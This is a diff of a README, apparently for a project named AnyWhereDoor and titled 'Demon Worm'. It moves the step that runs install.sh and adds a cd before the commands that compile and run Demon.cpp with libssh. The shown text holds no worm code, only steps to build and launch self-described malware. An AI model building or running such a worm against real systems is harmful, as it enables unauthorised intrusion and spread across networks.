@@ -11,15 +11,17 @@ First clone the project into your system
 
 https://github.com/apocalypse9949/AnyWhereDoor.git
 
-Install Demon libs  with ./install.sh
+
 
 Use this below command to run the Demon.cpp
 ```bash
+  cd AnyWhereDoor
+
   g++ -o Demon Demon.cpp -lssh
 
   ./Demon
 ```
-
+Install Demon libs  with ./install.sh
     
 ## Detailed Instructions
 # Demon Worm
